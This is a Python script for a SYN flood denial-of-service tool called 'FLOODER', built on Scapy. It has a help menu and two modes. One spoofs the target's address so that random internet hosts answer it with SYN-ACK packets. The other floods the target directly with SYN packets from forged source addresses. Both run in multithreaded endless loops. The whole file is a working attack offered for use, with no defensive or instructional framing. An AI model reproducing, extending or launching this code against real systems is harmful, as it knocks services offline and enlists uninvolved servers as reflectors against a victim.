from scapy.all import send, IP, UDP, TCP, Raw, RandShort
import threading
import random
import string
import signal
import time
import sys


logo = """
  # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
  #  _______  __        ______     ______    _______   _______  ______    #
  # |   ____||  |      /  __  \\   /  __  \\  |       \\ |   ____||   _  \\   #
  # |  |__   |  |     |  |  |  | |  |  |  | |  .--.  ||  |__   |  |_)  |  #
  # |   __|  |  |     |  |  |  | |  |  |  | |  |  |  ||   __|  |      /   #
  # |  |     |  `----.|  `--'  | |  `--'  | |  '--'  ||  |____ |  |\\  \\   #
  # |__|     |_______| \\______/   \\______/  |_______/ |_______||__| \\__|  #
  #                                                                       #
  # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
"""

help_menu = """
  [HELP]
   -------------------------------------------------------------------------
  |-p  (peripheral)  |Directs [SYN] packets to random servers in the name of|
  |                  |the target machine.                                   |
  |  [packet-ratio]  |The target machine gets flooded by [SYN, ACK] packets |
  |       1/2        |and sends a [RST] packet to each one.                 |
  |-------------------------------------------------------------------------|
  |-d  (directed)    |Directs [SYN] packets to the target machine in the    |
  |                  |name of random servers. The target responds to the    |
  |  [packet-ratio]  |servers with [SYN, ACK] and the servers respond with  |
  |       1/3        |[RST] packets.                                        |
   -------------------------------------------------------------------------
"""


def tcp_syn_flood_peripheral(target):
	while True:
		dst = ".".join([str(random.randint(1, 253)) for _ in range(4)])
		payload = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(1024))
		send(IP(src=target, dst=dst)/TCP(sport=RandShort(), dport=80, flags="S")/Raw(payload))


def tcp_syn_flood_directed(target):
	while True:
		src = ".".join([str(random.randint(1, 253)) for _ in range(4)])
		payload = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(1024))
		send(IP(src=src, dst=target)/TCP(sport=RandShort(), dport=RandShort(), flags="S")/Raw(payload))


def run_flood(flood_method, target, thread_num):
	threads = []
	for i in range(thread_num):
		t = threading.Thread(target=flood_method, args=(target,))
		t.daemon = True
		t.start()
		threads.append(t)
	for t in threads:
		while t.is_alive():
			t.join(1)
			time.sleep(0.5)


def exit():
	print("[-] Terminating attack")
	sys.exit(0)


def main():
	signal.signal(signal.SIGINT, lambda x, y: exit())
	flood_method = None
	thread_num = 1
	if "-d" in sys.argv:
		flood_method = tcp_syn_flood_directed
		sys.argv.remove("-d")
	elif "-p" in sys.argv:
		flood_method = tcp_syn_flood_peripheral
		sys.argv.remove("-p")

	has_thread = [a.startswith("-t=") for a in sys.argv]
	if any(has_thread):
		try:
			thread_num = int(sys.argv[has_thread.index(True)][3:])
			sys.argv.pop(has_thread.index(True))
		except:
			print("Invalid thread number")
			return

	if not flood_method or len(sys.argv) != 2:
		print(logo)
		print(help_menu)
	else:
		target = sys.argv[1]
		print(logo)
		method = "directed" if flood_method == tcp_syn_flood_directed else "peripheral"
		print(f"[+] Starting {method} attack against {target} using {thread_num} threads\n...")
		run_flood(flood_method, target, thread_num)


if __name__ == "__main__":
	main()